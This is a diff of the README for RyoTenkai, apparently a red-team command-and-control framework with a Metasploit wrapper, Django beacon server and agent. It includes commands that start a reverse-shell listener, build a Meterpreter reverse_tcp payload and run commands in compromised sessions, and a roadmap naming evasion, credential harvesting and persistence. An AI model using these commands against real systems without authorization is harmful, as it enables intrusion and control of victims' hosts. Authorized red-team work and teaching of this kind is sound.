@@ -1,162 +1,229 @@
+<div align="center">
+
 ```
- ____            _____          _         _    ____ ____  
-|  _ \ _   _  __|_   _|__ _ __ | | ____ _(_)  / ___|___ \ 
+ ____            _____          _         _    ____ ____
+|  _ \ _   _  __|_   _|__ _ __ | | ____ _(_)  / ___|___ \
 | |_) | | | |/ _ \| |/ _ \ '_ \| |/ / _` | | | |     __) |
-|  _ <| |_| | (_) | |  __/ | | |   < (_| | | | |___ / __/ 
+|  _ <| |_| | (_) | |  __/ | | |   < (_| | | | |___ / __/
 |_| \_\\__, |\___/|_|\___|_| |_|_|\_\__,_|_|  \____|_____|
-       |___/                                              
+       |___/
 ```
 
-# Ryotenkai Command Centre
+# RyoTenkai · 両転回
 
-## Overview
-The Ryotenkai Command Centre is a Django-based web application that serves as a central control interface for managing beacons, running Metasploit modules, monitoring jobs and sessions, and managing tasks related to offensive security operations. This solution uses a backend API to handle beacon check-ins, task assignments, and agent communications, making it ideal for centralized management of a distributed security operation.
+**A lab-grade Command-and-Control framework + Metasploit driver for authorized red-team work.**
 
-## Features
-- **Dashboard View**: Provides a comprehensive overview of active beacons, Metasploit jobs, sessions, and tasks.
-- **Beacon Management**: Allows for active tracking and management of beacons, with real-time status updates.
-- **Task Assignment**: Assign commands to beacons using a REST API and monitor task progress and outputs.
-- **Metasploit Integration**: Run Metasploit modules via the command centre and monitor active jobs and sessions.
-- **Agent Check-In**: Beacons periodically check in to update their status and keep the server informed of their availability.
+[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
+[![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
+[![Tests](https://img.shields.io/badge/tests-37%20passing-brightgreen.svg)](tests/)
+[![Status](https://img.shields.io/badge/status-experimental-orange.svg)](#roadmap)
+[![Made by](https://img.shields.io/badge/made%20by-d3vn0mi-black.svg)](https://github.com/d3vn0mi)
 
-## Structure
-- **Backend**: Django framework for handling HTTP requests, interacting with the database, and managing all core functionalities.
-- **Frontend**: HTML templates that display dashboards, active jobs, sessions, beacons, and task lists.
-- **Agent**: Python-based beacon agent that connects to the C2 server, checks in, and executes assigned tasks.
+</div>
 
-## Installation
-### Prerequisites
-- Python 3.8 or higher
-- Django 4.0 or higher
-- pymetasploit3 (for interacting with Metasploit)
-- Requests library for agent operations
+> ⚠️ **Authorized use only.** RyoTenkai is offensive-security tooling built for education, CTFs, and engagements you have **written permission** to run. It is lab software — not production-hardened. You are responsible for staying inside the law and your scope. See [Legal & authorized use](#legal--authorized-use).
 
-### Installation Steps
-1. Clone the repository:
-   ```sh
-   git clone https://github.com/yourusername/ryotenkai.git
-   cd ryotenkai
-   ```
-2. Set up a virtual environment:
-   ```sh
-   python3 -m venv venv
-   source venv/bin/activate
-   ```
-3. Install dependencies:
-   ```sh
-   pip install -r requirements.txt
-   ```
-4. Apply database migrations:
-   ```sh
-   python manage.py makemigrations
-   python manage.py migrate
-   ```
-5. Run the server:
-   ```sh
-   python manage.py runserver
-   ```
-6. Access the application at `http://127.0.0.1:8000/`.
+---
 
-## Usage
-### Dashboard View
-- **URL**: `/`
-- **Purpose**: Displays active beacons, Metasploit jobs, active sessions, and tasks.
+## What is this
 
-### Beacon Check-In Endpoint
-- **URL**: `/api/check_in/`
-- **Method**: POST
-- **Description**: Beacons use this endpoint to periodically check in and update their status.
-- **Payload Example**:
-  ```json
-  {
-      "hostname": "test-beacon"
-  }
-  ```
+RyoTenkai is an early-stage, education / red-team **Command-and-Control (C2) framework**. It has two faces:
 
-### Assign Task to Beacon
-- **URL**: `/api/assign_task/`
-- **Method**: POST
-- **Description**: Assigns a command task to a specific beacon.
-- **Payload Example**:
-  ```json
-  {
-      "hostname": "test-beacon",
-      "command": "ifconfig"
-  }
-  ```
+1. **`rtk` — the Metasploit CLI** (`ryotenkai.py`). A clean, layered, unit-tested wrapper over `pymetasploit3`. Run modules, poll jobs/sessions, drive sessions, generate payloads — either as one-shot subcommands that emit JSON (Ansible-friendly) or through an `msfconsole`-style interactive REPL. **This is the mature part of the project.**
+2. **The Django C2 server** (`ryotenkai_gui/`). A dashboard + REST API that manages beacons on target hosts, assigns shell tasks, and tracks Metasploit jobs/sessions. **Work in progress** — see the [roadmap](#roadmap) and [known gaps](#known-gaps).
 
-### Receive Task Results
-- **URL**: `/api/receive_result/`
-- **Method**: POST
-- **Description**: Beacons use this endpoint to send back the results of a completed task.
-- **Payload Example**:
-  ```json
-  {
-      "task_id": 1,
-      "result": "Command output here"
-  }
-  ```
+This repo is four loosely-coupled pieces, not one integrated app. Maturity varies — the table below is honest about it.
 
-## Agent
-The beacon agent is a Python script that connects to the command centre, checks in periodically, retrieves tasks, and sends task results.
+## Components
 
-### Agent Command
-Run the beacon agent with the following command:
+| Piece | Path | What it does | Maturity |
+|-------|------|--------------|----------|
+| **Metasploit CLI / REPL** | `ryotenkai.py` | Layered MSF driver: connection → pure data fns → table/JSON presentation → interactive `RtkConsole`. Unit-tested. | ✅ Mature |
+| **Django C2 server** | `ryotenkai_gui/` | Beacon mgmt, task assignment, dashboard, REST API; persists `Beacon`/`Task`/`Session`/`Job` to SQLite. | 🚧 WIP |
+| **Beacon agent** | `agent.py` | Runs on target: check in, sleep `[min,max]`, execute tasks, post results. | 🚧 Incomplete |
+| **Flask C2 prototype** | `ryotenkai_c2.py` | Minimal in-memory alternate C2 (`/beacon`, `/beacon/result`). | 🧪 Legacy/demo |
+
+The CLI is **independent of Django** — the Django app reimplements its own simpler Metasploit calls in `command_centre/utils.py`.
+
+---
+
+## Quickstart (CLI)
+
+The CLI is the fastest way to see RyoTenkai working. You need a reachable `msfrpcd` (Metasploit RPC daemon).
+
 ```sh
-python agent.py --c2-ip 127.0.0.1 --c2-port 8000 --min-sleep 60 --max-sleep 120
+# 1. Clone
+git clone https://github.com/d3vn0mi/RyoTenkai.git
+cd RyoTenkai
+
+# 2. Install CLI deps (pymetasploit3, prompt_toolkit, pytest)
+python3 -m venv venv && source venv/bin/activate
+pip install -r requirements.txt
+
+# 3. Point config.ini [default] at your msfrpcd (host/port/password/ssl)
+
+# 4. Start the Metasploit RPC daemon (or run your own)
+python ryotenkai.py start_rpc
+
+# 5. Drop into the interactive console
+python ryotenkai.py interactive
 ```
-- **c2-ip**: IP address of the C2 server.
-- **c2-port**: Port of the C2 server.
-- **min-sleep, max-sleep**: The agent sleeps for a random interval between these values before the next check-in.
 
-## Models
-### Beacon
-- **hostname**: The unique identifier for the beacon.
-- **last_checkin**: Timestamp of the last time the beacon checked in.
-- **status**: Current status of the beacon (e.g., active, dormant).
+Run the test suite (mock RPC — no live msfrpcd needed):
 
-### Task
-- **beacon**: The beacon assigned to this task.
-- **command**: Command to be run by the beacon.
-- **result**: Output of the command.
-- **status**: Status of the task (e.g., pending, completed).
+```sh
+pip install -r requirements.txt
+pytest                     # 37 passing; pytest.ini disables a broken global plugin
+```
 
-### Session
-- **session_id**: The ID of the session.
-- **hostname**: Hostname associated with the session.
-- **status**: Status of the session (e.g., active, closed).
+---
 
-### Job
-- **job_id**: The ID of the Metasploit job.
-- **module**: Metasploit module being run.
-- **status**: Status of the job.
+## Usage guide
 
-## API Endpoints
-- `/api/check_in/` - Beacon check-in endpoint.
-- `/api/assign_task/` - Assigns a command to a beacon.
-- `/api/receive_result/` - Endpoint to receive results from beacons.
+The CLI has two modes that share one data layer:
+
+- **Non-interactive subcommands** print structured **JSON** to stdout (stable contract for Ansible / scripting).
+- **Interactive REPL** renders human-readable tables by default (toggle with `set output json`).
+
+### Non-interactive subcommands
+
+```sh
+# Run any module via a console (run -j) and get structured output
+python ryotenkai.py run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444
+#   options accept OPTION=VALUE (preferred) or "OPTION VALUE"
+
+# Poll active jobs / sessions (JSON)
+python ryotenkai.py get_jobs
+python ryotenkai.py get_sessions
+
+# Run command(s) inside an existing session
+python ryotenkai.py run_command 4 "whoami" "id"
+
+# Generate a payload with msfvenom
+python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
+
+# Launch the Metasploit RPC daemon
+python ryotenkai.py start_rpc
+```
+
+Every subcommand above writes JSON to stdout — pipe it straight into `jq` or an Ansible task.
+
+### Interactive REPL
+
+```sh
+python ryotenkai.py interactive
+```
+
+An `msfconsole`-style console over a persistent RPC client (command history at `~/.rtk_history`):
+
+| Command | Action |
+|---------|--------|
+| `use <module>` | select a module |
+| `set <OPT> <VAL>` | set a module option |
+| `unset <OPT>` | clear an option |
+| `options` | show current module + options |
+| `run` / `exploit` | run the current module (`run -j`) |
+| `back` | clear current module |
+| `jobs` / `jobs -k <id>` | list / kill jobs |
+| `sessions` / `sessions -i <id>` | list / interact with a session |
+| `generate <fmt> <payload> <lhost> <lport> <outfile>` | build a payload |
+| `set output json\|table` | switch output format |
+| `connect` | show the active RPC connection |
+| `help` / `?` | command reference |
+| `exit` / `quit` | leave the console |
+
+Inside `sessions -i <id>`, type commands directly into the session; `background` or `Ctrl-D` returns to the main prompt (the session stays alive).
+
+---
+
+## Configuration
+
+The CLI reads defaults from `config.ini [default]`:
+
+```ini
+[default]
+rpc_password = msfrpc
+rpc_server   = 10.192.0.3
+rpc_port     = 55559
+rpc_ssl      = True
+```
+
+Per-subcommand sections (`[run_module]`, `[generate_payload]`, …) hold reusable option presets.
+
+> ⚠️ **Known config caveat:** `rpc_ssl` in `config.ini` is **not** currently wired through — `--rpc-ssl` is a flag that defaults off, so pass `--rpc-ssl` explicitly until [Phase 1](#roadmap) fixes the precedence. Any flag you pass on the command line overrides the config value.
+
+---
+
+## Django C2 (work in progress)
+
+The real C2 server lives in `ryotenkai_gui/` (Django 4.2, app `command_centre`).
+
+```sh
+cd ryotenkai_gui
+python manage.py makemigrations command_centre   # migrations are NOT committed — generate first
+python manage.py migrate
+python manage.py runserver                        # http://127.0.0.1:8000/
+```
+
+Beacon ↔ C2 flow: `agent.py` → `POST /api/check_in/` → operator assigns work via `POST /api/assign_task/` → beacon returns output via `POST /api/receive_result/`.
+
+The Django app needs `django` (4.2) and `requests` (and `flask` for the prototype) installed separately — `requirements.txt` currently pins **CLI deps only**.
+
+### Known gaps
+
+The tree has real cross-file mismatches (being worked through on the roadmap):
+
+- `agent.py` posts results to `/receive_result` but the route is `/api/receive_result/`.
+- The agent never pulls tasks — the task-fetch half of the loop is unimplemented.
+- `check_in` view calls `timezone.now()` without importing it (`NameError`).
+- `jobs_sessions` view renders `jobs_sessions.html`; the file on disk is `job_sessions.html`.
+- Metasploit creds differ between Django (`utils.py`, `msfpassword`:55552) and the CLI (`config.ini`, 55559).
+
+> All REST endpoints are `@csrf_exempt` and unauthenticated; `settings.py` is dev-only (`DEBUG=True`, hardcoded `SECRET_KEY`). Do not expose this server.
+
+---
 
 ## Roadmap
-1. **Enhanced Beacon Management**: Integrate beacon geolocation and status visualization on the dashboard.
-2. **Advanced Task Scheduling**: Allow scheduling of tasks for beacons at specific times.
-3. **Beacon Grouping**: Ability to group beacons and assign tasks to groups for parallel execution.
-4. **Scalable Infrastructure**: Optimize the application to support hundreds or thousands of beacons, using scalable storage solutions like Redis or PostgreSQL and load balancing.
-5. **Redundancy and Failover**: Implement redundancy for critical components to ensure continuity of command and control even in case of server failure.
-6. **Encrypted Communication**: Implement end-to-end encryption for communication between the agent and the server, improving the security of the C2 network.
-7. **Beacon Evasion Techniques**: Add techniques for beacon evasion, such as randomized sleep times, protocol obfuscation, and anti-detection mechanisms.
-8. **User Role Management**: Add user roles and permissions for multi-operator usage, similar to other advanced C2 frameworks.
-9. **Real-Time Notifications**: Integrate WebSockets or similar technologies to provide real-time updates on beacon activity, jobs, and sessions.
-10. **Advanced Post-Exploitation Modules**: Add support for advanced post-exploitation modules, such as lateral movement, credential harvesting, and persistence.
-11. **Integration with Threat Intelligence Feeds**: Allow beacons to gather and report threat intelligence to assist operators in making real-time decisions.
-12. **Campaign Management**: Provide functionality to manage and track campaigns, where users can track multi-stage operations.
-13. **Cross-Platform Agent Support**: Develop agents for Windows, macOS, and Linux to provide broader support for various target environments.
+
+Reality-based and phased. ✅ = done, the rest is planned.
+
+- **✅ Phase 0 — CLI foundation:** layered architecture, interactive REPL, 37-test suite, JSON stdout contract, config-key fix.
+- **Phase 1 — Packaging & config:** `pip install`, `rtk` console entrypoint, single source of truth for connection params (CLI > env > config > default), wire `rpc_ssl` from config.
+- **Phase 2 — RPC perf & reliability:** persistent client reuse, adaptive (non-fixed) polling, reconnect/timeout handling, cached jobs/sessions.
+- **Phase 3 — REPL UX:** live module/option tab-completion (queried from msf), `search`, colored output, history search, sharper errors.
+- **Phase 4 — Metasploit coverage:** `info`, kill/upgrade sessions, db/creds/loot read.
+- **Phase 5+ — Django C2:** fix the [known gaps](#known-gaps), implement the task-pull loop, then C2 features — beacon grouping, encrypted comms, multi-operator auth, real-time dashboard.
+
+Detailed CLI design: [`docs/superpowers/specs/2026-06-16-ryotenkai-cli-optimization-design.md`](docs/superpowers/specs/2026-06-16-ryotenkai-cli-optimization-design.md).
+
+---
+
+## Project layout
+
+```
+ryotenkai.py            # rtk CLI + interactive REPL (the mature core)
+agent.py                # beacon agent (target-side)
+ryotenkai_c2.py         # Flask C2 prototype (legacy)
+config.ini              # CLI connection + per-command presets
+tests/                  # pytest suite (mock RPC client)
+ryotenkai_gui/          # Django C2 server (WIP)
+docs/                   # specs & implementation plans
+```
+
+---
 
 ## Contributing
-Contributions are welcome! Please create an issue or pull request if you have any ideas or improvements.
+
+Issues and PRs welcome. Keep two contracts intact: non-interactive subcommands emit JSON on stdout, and pure data functions return data (presentation stays in the `format_*` layer). Add tests with behavior — the suite runs against a mock RPC client, so no live msfrpcd is required.
+
+## Legal & authorized use
+
+RyoTenkai exists for **authorized** security testing, research, and education. Using it against systems you do not own or lack explicit written permission to test is illegal in most jurisdictions. The author assumes no liability for misuse. Stay in scope, stay legal.
 
 ## License
-This project is licensed under the MIT License. See the LICENSE file for more details.
 
-## Contact
-For any inquiries, please contact info@isomarakis.eu.
+Licensed under the **Apache License 2.0** — see [LICENSE](LICENSE).
 
+## Author
+
+Built by **[d3vn0mi](https://github.com/d3vn0mi)** · [github.com/d3vn0mi/RyoTenkai](https://github.com/d3vn0mi/RyoTenkai)
